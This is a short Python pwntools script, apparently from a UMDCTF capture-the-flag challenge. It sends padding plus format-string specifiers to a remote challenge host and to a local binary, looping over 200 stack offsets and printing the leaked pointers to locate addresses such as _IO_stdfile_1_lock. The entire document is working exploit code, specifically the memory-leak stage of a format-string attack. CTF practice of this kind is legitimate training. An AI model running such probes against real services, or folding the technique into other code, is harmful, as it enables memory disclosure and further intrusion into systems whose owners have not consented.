#!/usr/bin/python2
from pwn import *
padding = b"A"*272
def kekw(payload):
    io.sendlineafter("> ", payload, timeout=1)
    p.sendlineafter("> ", payload, timeout=1)

context.log_level = 'warn'
for i in range(200):
    try:
        io = remote("chals5.umdctf.io", 7002)
        p = process("./chall")
        kekw(padding + "%"  + str(i) +"$p") #_IO_stdfile_1_lock
        io.recvuntil("Current location: ")
        leak1 = int(io.recvline().strip(b"\n").decode('utf-8'), 16)
        p.recvuntil("Current location: ")
        leak2 = int(p.recvline().strip(b"\n").decode('utf-8'), 16)

        print(i, hex(leak1), ": REMOTE || ", hex(leak2), ": LOCAL")
        # print(i, hex(leak2), "LOCAL")
        io.close()
        p.close()
    except :
        pass